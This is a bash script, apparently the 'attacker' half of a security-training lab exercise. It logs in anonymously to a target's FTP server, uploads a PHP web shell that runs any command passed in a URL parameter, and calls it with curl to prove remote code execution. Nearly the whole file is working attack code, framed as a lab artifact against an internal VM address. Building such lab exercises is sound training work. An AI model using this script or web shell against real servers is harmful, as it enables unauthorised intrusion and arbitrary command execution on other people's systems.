#!/usr/bin/env bash
# Run this ON kali (vagrant ssh kali) once enable-vulnerability.sh has run on
# target. Logs in to target's FTP anonymously, drops a small PHP web shell
# into the (writable) web root, then calls it over HTTP to prove code
# execution. This is the "attacker" half of exercise 01 - see
# exercises/01-ftp-webshell/README.md for the full exercise.
set -euo pipefail
TARGET=10.10.20.10
SHELL_NAME="minisoc_shell_$RANDOM.php"

command -v ftp >/dev/null || sudo apt-get install -y -qq ftp >/dev/null

cat > /tmp/shell.php <<'PHP'
<?php
// Mini-SOC training artifact (exercises/01-ftp-webshell) - NOT disguised,
// NOT persistent beyond this exercise. Runs one shell command from ?c=.
echo "<pre>Mini-SOC exercise 01 web shell\n";
echo shell_exec($_GET['c'] ?? 'id');
echo "</pre>";
PHP

echo "[1/3] Anonymous FTP login + upload of ${SHELL_NAME} into /uploads"
ftp -inv "$TARGET" <<FTP
user anonymous anonymous@example.com
cd uploads
binary
put /tmp/shell.php ${SHELL_NAME}
bye
FTP

echo
echo "[2/3] Triggering the web shell over HTTP (whoami)"
curl -s "http://${TARGET}/uploads/${SHELL_NAME}?c=whoami"

echo
echo "[3/3] Proving real code execution (writing a marker file via the shell)"
curl -s "http://${TARGET}/uploads/${SHELL_NAME}?c=echo+pwned+by+exercise-01+%3E+/tmp/exercise01_proof.txt" >/dev/null
curl -s "http://${TARGET}/uploads/${SHELL_NAME}?c=cat+/tmp/exercise01_proof.txt"

echo
echo "Done. Web shell is at http://${TARGET}/uploads/${SHELL_NAME}?c=<command>"
rm -f /tmp/shell.php
